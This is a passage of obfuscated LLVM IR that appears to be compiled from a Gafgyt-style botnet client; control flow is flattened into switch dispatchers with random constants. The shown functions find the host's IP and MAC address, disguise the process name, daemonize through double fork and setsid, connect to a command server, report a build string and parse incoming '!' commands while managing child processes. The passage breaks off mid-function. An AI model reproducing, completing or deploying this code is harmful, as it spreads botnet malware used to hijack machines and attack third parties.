  %44 = call i32 @connectTimeout(i32 %41, i8* %42, i32 %43, i32 30)
  %45 = icmp ne i32 %44, 0
  %46 = select i1 %45, i32 1376562060, i32 1740177639
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  store i32 1, i32* %1, align 4
  store i32 -596933415, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 -596933415, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %1, align 4
  ret i32 %50

loopEnd:                                          ; preds = %48, %47, %39, %32, %21, %18, %17, %11, %8, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1718136308, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1718136308, label %first
    i32 -1983273270, label %16
    i32 109903457, label %17
    i32 -81541439, label %31
    i32 -589357869, label %32
    i32 823109776, label %39
    i32 697583149, label %40
    i32 -1158078199, label %45
    i32 1688588247, label %51
    i32 850285987, label %56
    i32 -303805266, label %58
    i32 347970996, label %64
    i32 1026915638, label %67
    i32 1051581753, label %69
    i32 1421623852, label %71
    i32 1787677999, label %78
    i32 -1759549241, label %86
    i32 554986057, label %90
    i32 -122484706, label %102
    i32 -1179972625, label %105
    i32 -2023745544, label %106
    i32 1412710624, label %109
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp eq i32 %.reload, -1
  %15 = select i1 %14, i32 -1983273270, i32 109903457
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 1412710624, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 16, i32 4, i1 false)
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %19, align 4
  %20 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.95, i32 0, i32 0)) #2
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %22 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %21, i32 0, i32 0
  store i32 %20, i32* %22, align 4
  %23 = call zeroext i16 @htons(i16 zeroext 53) #13
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %23, i16* %24, align 2
  %25 = load i32, i32* %2, align 4
  %26 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %27 = call i32 @connect(i32 %25, %struct.sockaddr* %26, i32 16)
  store i32 %27, i32* %4, align 4
  %28 = load i32, i32* %4, align 4
  %29 = icmp eq i32 %28, -1
  %30 = select i1 %29, i32 -81541439, i32 -589357869
  store i32 %30, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 1412710624, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 16, i32* %6, align 4
  %33 = load i32, i32* %2, align 4
  %34 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %35 = call i32 @getsockname(i32 %33, %struct.sockaddr* %34, i32* %6) #2
  store i32 %35, i32* %4, align 4
  %36 = load i32, i32* %4, align 4
  %37 = icmp eq i32 %36, -1
  %38 = select i1 %37, i32 823109776, i32 697583149
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 1412710624, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %42 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %41, i32 0, i32 0
  %43 = load i32, i32* %42, align 4
  store i32 %43, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %44 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.96, i32 0, i32 0), i32 0)
  store i32 %44, i32* %7, align 4
  store i32 -1158078199, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %47 = load i32, i32* %7, align 4
  %48 = call i8* @fdgets(i8* %46, i32 4096, i32 %47)
  %49 = icmp ne i8* %48, null
  %50 = select i1 %49, i32 1688588247, i32 1421623852
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %53 = call i8* @strstr(i8* %52, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.97, i32 0, i32 0)) #10
  %54 = icmp ne i8* %53, null
  %55 = select i1 %54, i32 850285987, i32 1051581753
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %57, i8** %9, align 8
  store i32 -303805266, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i8*, i8** %9, align 8
  %60 = load i8, i8* %59, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp ne i32 %61, 9
  %63 = select i1 %62, i32 347970996, i32 1026915638
  store i32 %63, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %65 = load i8*, i8** %9, align 8
  %66 = getelementptr inbounds i8, i8* %65, i32 1
  store i8* %66, i8** %9, align 8
  store i32 -303805266, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i8*, i8** %9, align 8
  store i8 0, i8* %68, align 1
  store i32 1421623852, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %70, i8 0, i64 4096, i32 16, i1 false)
  store i32 -1158078199, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %7, align 4
  %73 = call i32 @close(i32 %72)
  %74 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %75 = load i8, i8* %74, align 16
  %76 = icmp ne i8 %75, 0
  %77 = select i1 %76, i32 1787677999, i32 -2023745544
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %80 = bitcast %union.anon.6* %79 to [16 x i8]*
  %81 = getelementptr inbounds [16 x i8], [16 x i8]* %80, i32 0, i32 0
  %82 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %83 = call i8* @strcpy(i8* %81, i8* %82) #2
  %84 = load i32, i32* %2, align 4
  %85 = call i32 (i32, i64, ...) @ioctl(i32 %84, i64 35111, %struct.ifreq* %11) #2
  store i32 0, i32* %10, align 4
  store i32 -1759549241, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i32, i32* %10, align 4
  %88 = icmp slt i32 %87, 6
  %89 = select i1 %88, i32 554986057, i32 -1179972625
  store i32 %89, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %92 = bitcast %union.anon.7* %91 to %struct.sockaddr*
  %93 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %92, i32 0, i32 1
  %94 = getelementptr inbounds [14 x i8], [14 x i8]* %93, i32 0, i32 0
  %95 = load i32, i32* %10, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds i8, i8* %94, i64 %96
  %98 = load i8, i8* %97, align 1
  %99 = load i32, i32* %10, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %100
  store i8 %98, i8* %101, align 1
  store i32 -122484706, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  %103 = load i32, i32* %10, align 4
  %104 = add nsw i32 %103, 1
  store i32 %104, i32* %10, align 4
  store i32 -1759549241, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  store i32 -2023745544, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* %2, align 4
  %108 = call i32 @close(i32 %107)
  store i32 1412710624, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  %110 = load i32, i32* %1, align 4
  ret i32 %110

loopEnd:                                          ; preds = %106, %105, %102, %90, %86, %78, %71, %69, %67, %64, %58, %56, %51, %45, %40, %39, %32, %31, %17, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #4

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #4

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.98, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca [1024 x i8], align 16
  %20 = alloca i32, align 4
  %21 = alloca [10 x i8*], align 16
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.99, i32 0, i32 0), i8** %6, align 8
  %25 = call i32 @access(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.100, i32 0, i32 0), i32 0) #2
  store i32 %25, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 179820662, i32* %switchVar
  %.reg2mem2 = alloca i1
  %.reg2mem4 = alloca i1
  %.reg2mem6 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 179820662, label %first
    i32 1526624817, label %28
    i32 -1583550305, label %29
    i32 -1527196235, label %30
    i32 -16445426, label %59
    i32 66339133, label %62
    i32 -1283562484, label %66
    i32 -1459044768, label %70
    i32 -769935629, label %71
    i32 -382606664, label %75
    i32 -846905573, label %76
    i32 -1032303078, label %77
    i32 564575950, label %78
    i32 10988445, label %79
    i32 -1863301707, label %80
    i32 1208506331, label %81
    i32 922669407, label %85
    i32 653842807, label %89
    i32 1256105547, label %91
    i32 -1354154217, label %95
    i32 -1858663522, label %101
    i32 1171401449, label %102
    i32 -1721644169, label %108
    i32 157744331, label %117
    i32 937208364, label %120
    i32 -1234775141, label %126
    i32 1948988537, label %137
    i32 827082534, label %140
    i32 -1862947346, label %153
    i32 915394280, label %159
    i32 1404721419, label %169
    i32 667056722, label %172
    i32 21199186, label %176
    i32 -1497593859, label %177
    i32 -203420903, label %180
    i32 1995975589, label %190
    i32 -787228075, label %193
    i32 -1084627529, label %199
    i32 -386505382, label %200
    i32 955071790, label %207
    i32 1228982509, label %210
    i32 -153233347, label %216
    i32 1130018299, label %221
    i32 -951542820, label %223
    i32 2072771254, label %226
    i32 487240928, label %232
    i32 1434479764, label %233
    i32 -1452087117, label %242
    i32 1009025220, label %252
    i32 504269620, label %261
    i32 1898387563, label %263
    i32 760767213, label %269
    i32 1797073101, label %271
    i32 704314101, label %277
    i32 1415531637, label %282
    i32 -506440026, label %284
    i32 -1950323898, label %287
    i32 -1135140309, label %292
    i32 -1369644251, label %297
    i32 1328046118, label %306
    i32 611795168, label %311
    i32 -1684599987, label %315
    i32 -1740929702, label %316
    i32 -861783696, label %323
    i32 -1671618769, label %329
    i32 -1046640619, label %333
    i32 -915580307, label %336
    i32 508862978, label %341
    i32 -1826614293, label %345
    i32 1343189589, label %351
    i32 1164926344, label %374
    i32 258500661, label %376
    i32 37316421, label %382
    i32 1397246524, label %383
    i32 941351777, label %388
    i32 -234323551, label %393
    i32 -971501414, label %396
    i32 1708587350, label %397
    i32 -1471287692, label %398
    i32 1475216316, label %399
    i32 -2002007867, label %400
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %26 = icmp ne i32 %.reload, -1
  %27 = select i1 %26, i32 1526624817, i32 -1583550305
  store i32 %27, i32* %switchVar
  br label %loopEnd

; <label>:28:                                     ; preds = %loopEntry
  store i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.101, i32 0, i32 0), i8** %6, align 8
  store i32 -1527196235, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  store i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.102, i32 0, i32 0), i8** %6, align 8
  store i32 -1527196235, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = call i8* @getBuild()
  %32 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.103, i32 0, i32 0), i8* %31)
  %33 = load i8**, i8*** %5, align 8
  %34 = getelementptr inbounds i8*, i8** %33, i64 0
  %35 = load i8*, i8** %34, align 8
  %36 = load i8**, i8*** %5, align 8
  %37 = getelementptr inbounds i8*, i8** %36, i64 0
  %38 = load i8*, i8** %37, align 8
  %39 = call i64 @strlen(i8* %38) #10
  %40 = call i8* @strncpy(i8* %35, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.99, i32 0, i32 0), i64 %39) #2
  %41 = load i8**, i8*** %5, align 8
  %42 = getelementptr inbounds i8*, i8** %41, i64 0
  %43 = load i8*, i8** %42, align 8
  %44 = load i8*, i8** %6, align 8
  %45 = call i32 (i8*, i8*, ...) @sprintf(i8* %43, i8* %44) #2
  %46 = load i8*, i8** %6, align 8
  %47 = ptrtoint i8* %46 to i64
  %48 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %47, i32 0, i32 0, i32 0)
  %49 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %50 = call i32 @getpid() #2
  %51 = xor i32 %49, %50
  call void @srand(i32 %51) #2
  %52 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %53 = call i32 @getpid() #2
  %54 = xor i32 %52, %53
  call void @init_rand(i32 %54)
  %55 = call i32 @getOurIP()
  %56 = call i32 @fork() #2
  store i32 %56, i32* %7, align 4
  %57 = icmp ne i32 %56, 0
  %58 = select i1 %57, i32 -16445426, i32 66339133
  store i32 %58, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i32, i32* %7, align 4
  %61 = call i32 @waitpid(i32 %60, i32* %9, i32 0)
  call void @exit(i32 0) #14
  unreachable

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i32, i32* %7, align 4
  %64 = icmp ne i32 %63, 0
  %65 = select i1 %64, i32 10988445, i32 -1283562484
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = call i32 @fork() #2
  store i32 %67, i32* %8, align 4
  %68 = icmp ne i32 %67, 0
  %69 = select i1 %68, i32 -1459044768, i32 -769935629
  store i32 %69, i32* %switchVar
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  call void @exit(i32 0) #14
  unreachable

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %8, align 4
  %73 = icmp ne i32 %72, 0
  %74 = select i1 %73, i32 -846905573, i32 -382606664
  store i32 %74, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  store i32 -1032303078, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  store i32 -1032303078, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  store i32 564575950, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  store i32 -1863301707, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  store i32 -1863301707, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  store i32 1208506331, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  %82 = call i32 @setsid() #2
  %83 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.104, i32 0, i32 0)) #2
  %84 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #2
  store i32 922669407, i32* %switchVar
  br label %loopEnd

; <label>:85:                                     ; preds = %loopEntry
  %86 = call i32 @initConnection()
  %87 = icmp ne i32 %86, 0
  %88 = select i1 %87, i32 653842807, i32 1256105547
  store i32 %88, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  %90 = call i32 @sleep(i32 5)
  store i32 922669407, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* @mainCommSock, align 4
  %93 = call i8* @getBuild()
  %94 = call i32 (i32, i8*, ...) @sockprintf(i32 %92, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.105, i32 0, i32 0), i8* %93)
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  store i32 -1354154217, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  %96 = load i32, i32* @mainCommSock, align 4
  %97 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %98 = call i32 @recvLine(i32 %96, i8* %97, i32 4096)
  store i32 %98, i32* %11, align 4
  %99 = icmp ne i32 %98, -1
  %100 = select i1 %99, i32 -1858663522, i32 1475216316
  store i32 %100, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  store i32 0, i32* %12, align 4
  store i32 1171401449, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  %103 = load i32, i32* %12, align 4
  %104 = sext i32 %103 to i64
  %105 = load i64, i64* @numpids, align 8
  %106 = icmp ult i64 %104, %105
  %107 = select i1 %106, i32 -1721644169, i32 -203420903
  store i32 %107, i32* %switchVar
  br label %loopEnd

; <label>:108:                                    ; preds = %loopEntry
  %109 = load i32*, i32** @pids, align 8
  %110 = load i32, i32* %12, align 4
  %111 = sext i32 %110 to i64
  %112 = getelementptr inbounds i32, i32* %109, i64 %111
  %113 = load i32, i32* %112, align 4
  %114 = call i32 @waitpid(i32 %113, i32* null, i32 1)
  %115 = icmp sgt i32 %114, 0
  %116 = select i1 %115, i32 157744331, i32 21199186
  store i32 %116, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i32, i32* %12, align 4
  %119 = add nsw i32 %118, 1
  store i32 %119, i32* %14, align 4
  store i32 937208364, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i32, i32* %14, align 4
  %122 = zext i32 %121 to i64
  %123 = load i64, i64* @numpids, align 8
  %124 = icmp ult i64 %122, %123
  %125 = select i1 %124, i32 -1234775141, i32 827082534
  store i32 %125, i32* %switchVar
  br label %loopEnd

; <label>:126:                                    ; preds = %loopEntry
  %127 = load i32*, i32** @pids, align 8
  %128 = load i32, i32* %14, align 4
  %129 = zext i32 %128 to i64
  %130 = getelementptr inbounds i32, i32* %127, i64 %129
  %131 = load i32, i32* %130, align 4
  %132 = load i32*, i32** @pids, align 8
  %133 = load i32, i32* %14, align 4
  %134 = sub i32 %133, 1
  %135 = zext i32 %134 to i64
  %136 = getelementptr inbounds i32, i32* %132, i64 %135
  store i32 %131, i32* %136, align 4
  store i32 1948988537, i32* %switchVar
  br label %loopEnd

; <label>:137:                                    ; preds = %loopEntry
  %138 = load i32, i32* %14, align 4
  %139 = add i32 %138, 1
  store i32 %139, i32* %14, align 4
  store i32 937208364, i32* %switchVar
  br label %loopEnd

; <label>:140:                                    ; preds = %loopEntry
  %141 = load i32*, i32** @pids, align 8
  %142 = load i32, i32* %14, align 4
  %143 = sub i32 %142, 1
  %144 = zext i32 %143 to i64
  %145 = getelementptr inbounds i32, i32* %141, i64 %144
  store i32 0, i32* %145, align 4
  %146 = load i64, i64* @numpids, align 8
  %147 = add i64 %146, -1
  store i64 %147, i64* @numpids, align 8
  %148 = load i64, i64* @numpids, align 8
  %149 = add i64 %148, 1
  %150 = mul i64 %149, 4
  %151 = call noalias i8* @malloc(i64 %150) #2
  %152 = bitcast i8* %151 to i32*
  store i32* %152, i32** %13, align 8
  store i32 0, i32* %14, align 4
  store i32 -1862947346, i32* %switchVar
  br label %loopEnd

; <label>:153:                                    ; preds = %loopEntry
  %154 = load i32, i32* %14, align 4
  %155 = zext i32 %154 to i64
  %156 = load i64, i64* @numpids, align 8
  %157 = icmp ult i64 %155, %156
  %158 = select i1 %157, i32 915394280, i32 667056722
  store i32 %158, i32* %switchVar
  br label %loopEnd

; <label>:159:                                    ; preds = %loopEntry
  %160 = load i32*, i32** @pids, align 8
  %161 = load i32, i32* %14, align 4
  %162 = zext i32 %161 to i64
  %163 = getelementptr inbounds i32, i32* %160, i64 %162
  %164 = load i32, i32* %163, align 4
  %165 = load i32*, i32** %13, align 8
  %166 = load i32, i32* %14, align 4
  %167 = zext i32 %166 to i64
  %168 = getelementptr inbounds i32, i32* %165, i64 %167
  store i32 %164, i32* %168, align 4
  store i32 1404721419, i32* %switchVar
  br label %loopEnd

; <label>:169:                                    ; preds = %loopEntry
  %170 = load i32, i32* %14, align 4
  %171 = add i32 %170, 1
  store i32 %171, i32* %14, align 4
  store i32 -1862947346, i32* %switchVar
  br label %loopEnd

; <label>:172:                                    ; preds = %loopEntry
  %173 = load i32*, i32** @pids, align 8
  %174 = bitcast i32* %173 to i8*
  call void @free(i8* %174) #2
  %175 = load i32*, i32** %13, align 8
  store i32* %175, i32** @pids, align 8
  store i32 21199186, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  store i32 -1497593859, i32* %switchVar
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %178 = load i32, i32* %12, align 4
  %179 = add nsw i32 %178, 1
  store i32 %179, i32* %12, align 4
  store i32 1171401449, i32* %switchVar
  br label %loopEnd

; <label>:180:                                    ; preds = %loopEntry
  %181 = load i32, i32* %11, align 4
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %182
  store i8 0, i8* %183, align 1
  %184 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @trim(i8* %184)
  %185 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %186 = call i8* @strstr(i8* %185, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.45, i32 0, i32 0)) #10
  %187 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %188 = icmp eq i8* %186, %187
  %189 = select i1 %188, i32 1995975589, i32 -787228075
  store i32 %189, i32* %switchVar
  br label %loopEnd

; <label>:190:                                    ; preds = %loopEntry
  %191 = load i32, i32* @mainCommSock, align 4
  %192 = call i32 (i32, i8*, ...) @sockprintf(i32 %191, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.106, i32 0, i32 0))
  store i32 -1354154217, i32* %switchVar
  br label %loopEnd

; <label>:193:                                    ; preds = %loopEntry
  %194 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %195 = call i8* @strstr(i8* %194, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.107, i32 0, i32 0)) #10
  %196 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %197 = icmp eq i8* %195, %196
  %198 = select i1 %197, i32 -1084627529, i32 -386505382
  store i32 %198, i32* %switchVar
  br label %loopEnd

; <label>:199:                                    ; preds = %loopEntry
  call void @exit(i32 0) #14
  unreachable

; <label>:200:                                    ; preds = %loopEntry
  %201 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  store i8* %201, i8** %15, align 8
  %202 = load i8*, i8** %15, align 8
  %203 = load i8, i8* %202, align 1
  %204 = zext i8 %203 to i32
  %205 = icmp eq i32 %204, 33
  %206 = select i1 %205, i32 955071790, i32 -1471287692
  store i32 %206, i32* %switchVar
  br label %loopEnd

; <label>:207:                                    ; preds = %loopEntry
  %208 = load i8*, i8** %15, align 8
  %209 = getelementptr inbounds i8, i8* %208, i64 1
  store i8* %209, i8** %16, align 8
  store i32 1228982509, i32* %switchVar
  br label %loopEnd

; <label>:210:                                    ; preds = %loopEntry
  %211 = load i8*, i8** %16, align 8
  %212 = load i8, i8* %211, align 1
  %213 = zext i8 %212 to i32
  %214 = icmp ne i32 %213, 32
  %215 = select i1 %214, i32 -153233347, i32 1130018299
  store i32 %215, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:216:                                    ; preds = %loopEntry
  %217 = load i8*, i8** %16, align 8
  %218 = load i8, i8* %217, align 1
  %219 = zext i8 %218 to i32
  %220 = icmp ne i32 %219, 0
  store i32 1130018299, i32* %switchVar
  store i1 %220, i1* %.reg2mem2
  br label %loopEnd

; <label>:221:                                    ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %222 = select i1 %.reload3, i32 -951542820, i32 2072771254
  store i32 %222, i32* %switchVar
  br label %loopEnd

; <label>:223:                                    ; preds = %loopEntry
  %224 = load i8*, i8** %16, align 8
  %225 = getelementptr inbounds i8, i8* %224, i32 1
  store i8* %225, i8** %16, align 8
  store i32 1228982509, i32* %switchVar
  br label %loopEnd

; <label>:226:                                    ; preds = %loopEntry
  %227 = load i8*, i8** %16, align 8
  %228 = load i8, i8* %227, align 1
  %229 = zext i8 %228 to i32
  %230 = icmp eq i32 %229, 0
  %231 = select i1 %230, i32 487240928, i32 1434479764
  store i32 %231, i32* %switchVar
  br label %loopEnd

; <label>:232:                                    ; preds = %loopEntry
  store i32 -1354154217, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  %234 = load i8*, i8** %16, align 8
  store i8 0, i8* %234, align 1
  %235 = load i8*, i8** %15, align 8
  %236 = getelementptr inbounds i8, i8* %235, i64 1
  store i8* %236, i8** %16, align 8
  %237 = load i8*, i8** %15, align 8
  %238 = load i8*, i8** %16, align 8
  %239 = call i64 @strlen(i8* %238) #10
  %240 = getelementptr inbounds i8, i8* %237, i64 %239
  %241 = getelementptr inbounds i8, i8* %240, i64 2
  store i8* %241, i8** %15, align 8
  store i32 -1452087117, i32* %switchVar
  br label %loopEnd

; <label>:242:                                    ; preds = %loopEntry
  %243 = load i8*, i8** %15, align 8
  %244 = load i8*, i8** %15, align 8
  %245 = call i64 @strlen(i8* %244) #10
  %246 = sub i64 %245, 1
  %247 = getelementptr inbounds i8, i8* %243, i64 %246
  %248 = load i8, i8* %247, align 1
  %249 = zext i8 %248 to i32
  %250 = icmp eq i32 %249, 10
  %251 = select i1 %250, i32 504269620, i32 1009025220
  store i32 %251, i32* %switchVar
  store i1 true, i1* %.reg2mem4
  br label %loopEnd

; <label>:252:                                    ; preds = %loopEntry
  %253 = load i8*, i8** %15, align 8
  %254 = load i8*, i8** %15, align 8
  %255 = call i64 @strlen(i8* %254) #10
  %256 = sub i64 %255, 1
  %257 = getelementptr inbounds i8, i8* %253, i64 %256
  %258 = load i8, i8* %257, align 1
  %259 = zext i8 %258 to i32
  %260 = icmp eq i32 %259, 13
  store i32 504269620, i32* %switchVar
  store i1 %260, i1* %.reg2mem4
  br label %loopEnd

; <label>:261:                                    ; preds = %loopEntry
